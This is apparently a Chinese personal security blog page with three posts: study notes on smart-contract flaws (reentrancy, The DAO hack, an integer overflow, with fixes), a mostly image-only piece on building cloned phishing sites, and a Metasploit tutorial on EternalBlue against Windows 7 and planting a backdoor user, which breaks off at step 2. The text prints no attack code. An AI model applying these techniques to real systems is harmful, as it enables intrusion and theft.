<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907205116102.png" alt="image-20210907205116102"></p>
<p>补充：拍卖结束时用一个for（）退款给拍卖的人。</p>
<p><strong>当出现多重合约调用情况</strong>：一个黑客写了一个合约hackV1（）合约，hackV1合约会；由于合约账户不用调用自身合约；所以黑客调用外部账户（另外一个账号）调用hackV1合约，再用转入hackV1合约的钱转到行拍卖合约进行拍卖（即hackV1合约通过调用拍卖合约，把转入把hackV1的再转到的拍卖合约）</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907211716347.png" alt="image-20210907211716347"></p>
<p>可能出现的问题：（hackV1合约只有一个函数，没有fallback（）函数）hackV1合约参与拍卖没问题，退款时会出现问题。执行退款for循环里transfer（）函数转账时，没有调用任何函数；当一个合约账户（这里是hackV1的账户）转账时（这里是收到转账）时没有调用任何函数，合约会自动调用fallback函数，而这个hackV1合约没有fallback函数；所以会抛出异常；又由于这里采用的是transfer（）函数进行交易，所以拍卖失败（出现异常）会发生回滚。回滚到交易前的状态，所以全部人都收不到退款。（注意：在拍卖混滚前，所有参与拍卖的货币，都是已经锁到了区块链上了；回滚只是回到了交易前的状态（程序认为是交易前状态，也就没有发生交易，就不会执行退款操作），但是实际上币已经支付出去了。）</p>
<p>引出：一旦合约代码出现漏洞/错误，放到了区块链上就无法修改，结果也不可改变。这是由于区块链不可篡改性导致的。</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907215416196.png" alt="image-20210907215416196"></p>
<p>补充：画红框的if语句的条件，只有在交易拍卖结束的时候才会为true</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907220032926.png" alt="image-20210907220032926"></p>
<p>补充：HackV2的fallback函数的if语句：当拍卖的返款的余额大于当初投入的钱（拍卖的余额足以支付报价）并且汽油量大于6000，状态深度小于500时；条件为真。</p>
<p><strong>出现的问题：</strong>当执行fallback函数时（就是function（）public payload{…}），调用了withdraw（）函数，当withdraw函数执行到上述红框语句（if的条件）时，又会触发HackV2的fallback函数，一直陷入死循环，直到拍卖里的币腿光；第一次调用是退回Hackv2用户自己的前，后面就是退别人的钱了。</p>
<p><strong>解决方法：</strong>（1）先将用户余额清零，再转账，转账失败再恢复余额；（2）call函数给为send函数/transfer（）因其汽油量问题。</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210907221512457.png" alt="image-20210907221512457"></p>
<p><strong>DAO（Decentralized Autonomous Orgarization）</strong></p>
<p>​    DAO去中心化的自治织，这是一个泛称。大概理念是：大家把对自己有兴趣的基金进行投币，最后由投票权重觉得用这些币去赞助那个基金。</p>
<p>​    <strong>The DAO组织被盗币事件</strong></p>
<p>​    The DAO组织是一个典型的DAO，它会用以太币转化成代币进行交易，而且退款机制是采用了拆分技术，拆分后会有28天的审议期，由所有矿工评价拆分的好坏/是否要这样拆分。</p>
<p>The DAO合约的代码（一个函数）</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210908091951239.png" alt="image-20210908091951239"></p>
<p><strong>问题/漏洞：</strong>先转账，再清零；其漏洞与上面拍卖例子的最后一个问题一样；可能会产生重入攻击。</p>
<p><strong>影响</strong>：The DAO组织的合约当时集资了大概1.5亿美元，对应合约的以太币大概全部以太币的10%+（一个合约的资金就占整个市场的10%+，是非常恐怖的）；黑客利用该漏洞盗取了5000万+美元，大概1/3的以太币；给社会带来的巨大的恐慌，严重危害了以太币的发展。</p>
<p><strong>解决方法</strong>（软分叉、硬分叉、采用黑客相同的手段转走剩下的钱</p>
<p>​    由于Tho DAO有28天的拆分期（即交易货币会被锁定28天），所以给以太坊留了一定的时间做对策。以太坊大部分人同意采用回滚，把货币全部回滚；剩下的少部分人认为以太坊干预并强制回滚背离了去中心化理念，他们部分人认为黑客只是利用了合约（就像利用法律/合同漏洞）并没有犯法。结果最后以太坊采用了回滚（采用了美国历史上Too big to fail的金融危机处理理念：这件事的影响太大了，破坏了生态健康发展，所以国家/组织应该出面帮忙解决）</p>
<p><strong>问：</strong>回滚这操作真的完全是背离了去中心化的理念么？</p>
<p><strong>主观认为：</strong>大部分人赞同，也代表了民主的少数服从多数，也不算是决定的中心化决定（思考：但多数人认为的就一定是正确的么？）</p>
<p><strong>具体补救方法：</strong></p>
<p>（1）软分叉：以太坊更新了软件，让The Dao 的账号无法交易，其他交易正常进行。（结果：由于大部分人认为官方强制执行回滚，所以交易的汽油费不应该由交易账号出，所以交易没有收取汽油费；从而引起了大量的非法型交易攻击，给矿工们造成了巨大的打击（白干活），进而失败了。）</p>
<p>（2）硬分叉：软分叉失败后（28天的审议期只剩下几天），以太坊通过软件升级的方法把The DAO上的资金转到新的合约上（这个合约只是用来退币）；把代币退转回以太币；决定在第129万个区块上执行。说明：由于是以太坊强制执行的，不管同意不同意都强行把资金转到新的合约上（正常交易是要用到签名的），不用签名；所以旧矿工会认为这是非法交易，不认同该区块，于是会产生分叉，新矿工认同旧矿工的区块，但旧矿工永远不会认同新矿工的区块，因此分叉会永远存在，所以是硬分叉。 </p>
<p><strong>问：</strong>存在分叉就可能受到双花攻击，那该怎么做？</p>
<p><strong>答：</strong>给两条链设置ID。</p>
<p><strong>问：</strong>The DAO 事件中，以太坊是把所有The DAO的账户锁定；为什么不只锁定黑客的账户？</p>
<p>答：由于合约是定死了（区块链不可篡改性），如果只锁定黑客的账户，那么其他的交易账户也可以利用该漏洞成为下一个黑客。（注意：回滚是退回到某个区块，产生一个新的分叉，在新的分叉开挖；由于在当前区块后成功产生6个区块后，当前区块的交易才会被完全确认，所以回滚的结点常常要考虑回退的交易最少/造成的影响最小；如果直接回退到出错结点，往往会引起较大的影响）</p>
<p><strong>问：</strong>什么时候需要智能合约？</p>
<p><strong>答：</strong>当需要一个共识的控制逻辑下，在那些互不认识的情况下建立共识机制的条件下。</p>
<p>以太坊事件：美链</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210908104505017.png" alt="image-20210908104505017"></p>
<p>美链的一个函数</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210908104607563.png" alt="image-20210908104607563"></p>
<p>存在问题：数据溢出</p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210908104646321.png" alt="image-20210908104646321"></p>
<p><img src="/2021/09/08/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/image-20210908104755939.png" alt="image-20210908104755939"></p>
<p><strong>数据溢出解决方法：</strong>c=a*b;if b=c/a,ture</p>
<p>注意：即使数据没溢出，但是如果操作数之间的精度不够，可能会出现精度丢失，造成的结果也不对。但是如果都整数类型，且是先进行乘法后用除法验证，就可以准确判断溢出问题。</p>
<p><strong>加密货币的应用场景：</strong>已有的支付方式没有较好解决的领域</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/" class="post-title-link" itemprop="url">揭秘克隆网站和钓鱼网站背后的技术</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-08-22 09:08:07" itemprop="dateCreated datePublished" datetime="2021-08-22T09:08:07+08:00">2021-08-22</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-10-05 20:59:13" itemprop="dateModified" datetime="2021-10-05T20:59:13+08:00">2021-10-05</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id><a href="#" class="headerlink" title></a><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210908110616364.png" alt="image-20210908110616364"></h1><p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210908110130833.png" alt="image-20210908110130833"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820094901355.png" alt="image-20210820094901355"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210908110635582.png" alt="image-20210908110635582"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820095053082.png" alt="image-20210820095053082"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210908105753727.png" alt="image-20210908105753727"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820095312794.png" alt="image-20210820095312794"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820095343365.png" alt="image-20210820095343365"></p>
<p>重启网络服务</p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820095428655.png" alt="image-20210820095428655"></p>
<h2 id="-1"><a href="#-1" class="headerlink" title></a><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210908110111993.png" alt="image-20210908110111993"></h2><p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820100801661.png" alt="image-20210820100801661"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820101034588.png" alt="image-20210820101034588"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820100934417.png" alt="image-20210820100934417"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820100948433.png" alt="image-20210820100948433"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820101128896.png" alt="image-20210820101128896"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820101201274.png" alt="image-20210820101201274"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820101328065.png" alt="image-20210820101328065"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210908105847666.png" alt="image-20210908105847666"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820150803600.png" alt="image-20210820150803600"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820101948469.png" alt="image-20210820101948469"></p>
<p>效果展示</p>
<p>控制台查看</p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820102127052.png" alt="image-20210820102127052"></p>
<p>图形界面查看</p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820102200407.png" alt="image-20210820102200407"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820102218425.png" alt="image-20210820102218425"></p>
<p>查看/修改网站代码</p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820102327601.png" alt="image-20210820102327601"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820102347095.png" alt="image-20210820102347095"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210908110703785.png" alt="image-20210908110703785"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210908110052540.png" alt="image-20210908110052540"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104349468.png" alt="image-20210820104349468"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104408849.png" alt="image-20210820104408849"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104603190.png" alt="image-20210820104603190"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104459523.png" alt="image-20210820104459523"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104645872.png" alt="image-20210820104645872"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104659293.png" alt="image-20210820104659293"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104745057.png" alt="image-20210820104745057"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104827922.png" alt="image-20210820104827922"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820104924609.png" alt="image-20210820104924609"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820105003558.png" alt="image-20210820105003558"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210908105946439.png" alt="image-20210908105946439"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820105313524.png" alt="image-20210820105313524"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210820105655498.png" alt="image-20210820105655498"></p>
<p><img src="/2021/08/22/%E6%8F%AD%E7%A7%98%E5%85%8B%E9%9A%86%E7%BD%91%E7%AB%99%E5%92%8C%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%E8%83%8C%E5%90%8E%E7%9A%84%E6%8A%80%E6%9C%AF/image-20210908110007418.png" alt="image-20210908110007418"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/" class="post-title-link" itemprop="url">Mestasploit渗透测试之制作隐藏后门</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-08-19 20:54:06" itemprop="dateCreated datePublished" datetime="2021-08-19T20:54:06+08:00">2021-08-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-08-26 12:57:44" itemprop="dateModified" datetime="2021-08-26T12:57:44+08:00">2021-08-26</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">信息安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="Mestasploit渗透测试之制作隐藏后门"><a href="#Mestasploit渗透测试之制作隐藏后门" class="headerlink" title="Mestasploit渗透测试之制作隐藏后门"></a>Mestasploit渗透测试之制作隐藏后门</h1><h2 id="一、隐藏后门的意义"><a href="#一、隐藏后门的意义" class="headerlink" title="一、隐藏后门的意义"></a>一、隐藏后门的意义</h2><p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819101229168.png" alt="image-20210819101229168"></p>
<h2 id="二、使用msf17-010永恒之蓝漏洞对win7进行渗透"><a href="#二、使用msf17-010永恒之蓝漏洞对win7进行渗透" class="headerlink" title="二、使用msf17-010永恒之蓝漏洞对win7进行渗透"></a>二、使用msf17-010永恒之蓝漏洞对win7进行渗透</h2><p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819102221708.png" alt="image-20210819102221708"></p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819102252809.png" alt="image-20210819102252809"></p>
<p><strong>win7环境</strong></p>
<p>防火墙可以打开（使用家庭/工作网络）</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819102146715.png" alt="image-20210819102146715"></p>
<p><strong>步骤1：</strong>渗透</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819105253580.png" alt="image-20210819105253580"></p>
<p>加载、配置、启动模块</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819105337567.png" alt="image-20210819105337567"></p>
<p>渗透成功</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819105421575.png" alt="image-20210819105421575"></p>
<p><strong>步骤2：</strong>创建一个新用户远程连接win7桌面</p>
<p><img src="/2021/08/19/Mestasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%88%B6%E4%BD%9C%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20210819105618584.png" alt="image-20210819105618584"></p>
